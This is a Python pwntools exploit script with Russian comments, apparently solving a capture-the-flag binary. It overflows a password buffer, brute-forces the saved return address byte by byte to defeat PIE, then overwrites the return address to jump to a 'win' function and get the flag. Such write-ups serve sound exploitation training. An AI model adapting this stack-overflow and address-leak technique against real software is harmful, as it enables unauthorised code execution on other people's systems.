#!/usr/bin/env python3
from pwn import *

# Конфигурация
BINARY = "./chall"
HOST = "localhost"
PORT = 5000


def exploit():
    # Загружаем бинарник для получения смещений
    elf = ELF(BINARY)

    # Подключаемся к процессу
    p = process(BINARY)
    # Или к удаленному серверу: p = remote(HOST, PORT)

    # Смещения из дизассемблера
    MAIN_OFFSET = 0x1582
    WIN_OFFSET = 0x128e

    def login(username, password):
        p.sendlineafter(b">> ", b"1")
        p.sendlineafter(b"code:\n", username)
        p.sendlineafter(b"password:\n", password)

    def register(username, password):
        p.sendlineafter(b">> ", b"2")
        p.sendlineafter(b"code:\n", username)
        p.sendlineafter(b"password:\n", password)

    # Шаг 1: Регистрируемся с переполнением
    print("[*] Registering with overflow...")
    username = b"alex"
    password = b"A" * 16  # Переполняем буфер password
    register(username, password)

    # Шаг 2: Подбираем утечку адреса возврата
    print("[*] Leaking return address...")
    leaked_password = b"A" * 16

    while len(leaked_password) < 24:  # 16 + 8 (saved RBP)
        for byte in range(256):
            test_password = leaked_password + bytes([byte])

            login(username, test_password)
            response = p.recvline()

            if b"Access granted" in response:
                leaked_password = test_password
                leak = u64(leaked_password[16:].ljust(8, b'\x00'))
                print(f"[+] Leaked bytes: {leaked_password[16:].hex()}")
                print(f"[+] Leaked address: 0x{leak:x}")
                break
        else:
            print("[-] Failed to leak byte")
            break

    if len(leaked_password) >= 24:
        # Вычисляем базовый адрес PIE
        pie_leak = u64(leaked_password[16:24].ljust(8, b'\x00'))
        pie_base = pie_leak - MAIN_OFFSET
        win_addr = pie_base + WIN_OFFSET

        print(f"[+] PIE base: 0x{pie_base:x}")
        print(f"[+] Win function: 0x{win_addr:x}")

        # Шаг 3: Вызываем Win через переполнение
        print("[*] Triggering Win function...")

        # Создаем payload для переполнения
        payload = b"A" * 16  # Заполняем password буфер
        payload += b"B" * 8  # Перезаписываем saved RBP
        payload += p64(win_addr)  # Адрес возврата = Win

        login(username, payload)

        # Получаем флаг
        print("[+] Getting flag...")
        p.interactive()
    else:
        print("[-] Failed to leak address")


if __name__ == "__main__":
    exploit()